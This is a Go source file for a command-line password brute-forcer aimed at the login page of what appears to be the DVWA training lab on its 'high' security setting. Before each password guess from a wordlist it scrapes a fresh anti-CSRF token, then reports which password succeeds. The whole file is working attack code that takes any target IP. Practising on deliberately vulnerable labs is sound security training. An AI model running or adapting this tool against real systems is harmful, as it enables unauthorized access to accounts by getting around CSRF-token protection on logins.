package main

import (
        "bufio"
        "fmt"
        "io/ioutil"
        "log"
        "net/http"
        "os"
        "strings"

        "golang.org/x/net/html"
)

type methods interface {
        Brute()
        GetCSRF()
}

type AntiCSRFBrute struct {
        ip        string
        phpsessid string
        wordlist  string
}

func parseHTMLContent(htmlContent string) string {
        doc, err := html.Parse(strings.NewReader(htmlContent))
        if err != nil {
                fmt.Println("Error parsing HTML:", err)
                return ""
        }

        var targetText string
        var traverseFunc func(*html.Node)
        traverseFunc = func(n *html.Node) {
                if n.Type == html.ElementNode && n.Data == "p" {
                        for c := n.FirstChild; c != nil; c = c.NextSibling {
                                if c.Type == html.TextNode {
                                        targetText = c.Data
                                        return
                                }
                        }
                }

                for c := n.FirstChild; c != nil; c = c.NextSibling {
                        traverseFunc(c)
                }
        }

        traverseFunc(doc)

        return targetText
}

func (a *AntiCSRFBrute) GetCSRF() string {
        getReq, err := http.NewRequest("GET", "http://"+a.ip+"/vulnerabilities/brute/?username=admin&password=admin&Login=Login", nil)
        cookies := "PHPSESSID=" + a.phpsessid + "; security=high"
        getReq.Header.Set("Cookie", cookies)
        if err != nil {
                log.Fatal(err)
        }

        // Send the request and get the response
        client := &http.Client{}
        resp, err := client.Do(getReq)
        if err != nil {
                fmt.Println("Error sending request:", err)
        }
        defer resp.Body.Close()
        if resp.StatusCode == 200 {

                // Read the response body
                body, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        fmt.Println("Error reading response body:", err)
                }

                // Convert the response body to a string and print it
                //              fmt.Println(string(body))

                doc, err := html.Parse(strings.NewReader(string(body)))

                //Locate the CSRF token
                var value string
                var traverseFunc func(*html.Node)
                traverseFunc = func(n *html.Node) {
                        if n.Type == html.ElementNode && n.Data == "input" {
                                var name, inputValue string
                                for _, attr := range n.Attr {
                                        if attr.Key == "name" {
                                                name = attr.Val
                                        } else if attr.Key == "value" {
                                                inputValue = attr.Val
                                        }
                                }
                                if name == "user_token" {
                                        value = inputValue
                                }
                        }

                        for c := n.FirstChild; c != nil; c = c.NextSibling {
                                traverseFunc(c)
                        }
                }

                traverseFunc(doc)

                return value
        }
        return ""
}

func (a *AntiCSRFBrute) Brute() {
        //Get CSRF token
        // Open the wordlist file

        file, err := os.Open(a.wordlist)
        if err != nil {
                fmt.Println("Error opening wordlist file:", err)
                return
        }
        defer file.Close()

        // Read the file line by line
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
                word := scanner.Text()

                // Process the word here (e.g., print it)

                csrfToken := a.GetCSRF()
                req, err := http.NewRequest("GET", "http://"+a.ip+"/vulnerabilities/brute/?username=admin&password="+word+"&Login=Login&user_token="+csrfToken, nil)
                cookies := "PHPSESSID=" + a.phpsessid + "; security=high"
                req.Header.Set("Cookie", cookies)

                client := &http.Client{}
                resp, err := client.Do(req)
                if err != nil {
                        fmt.Println("Error sending request:", err)
                }
                defer resp.Body.Close()

                // Read the response body
                body, err := ioutil.ReadAll(resp.Body)
                if err != nil {
                        fmt.Println("Error reading response body:", err)
                }

                if strings.Contains(string(body), "Username and/or password incorrect.") {
                        fmt.Println("Incorrect password:", word)
                } else {
                        fmt.Println("Correct password:", word)
                }

                if err := scanner.Err(); err != nil {
                        fmt.Println("Error reading wordlist file:", err)
                }
        }

}

func main() {
        var b AntiCSRFBrute
        if len(os.Args) != 4 {
                fmt.Println("Usage: ./anticsrf_brute <ip> <phpsessid> <wordlist>")
                return
        } else {
                b.ip = os.Args[1]
                b.phpsessid = os.Args[2]
                b.wordlist = os.Args[3]
                b.Brute()
        }
}
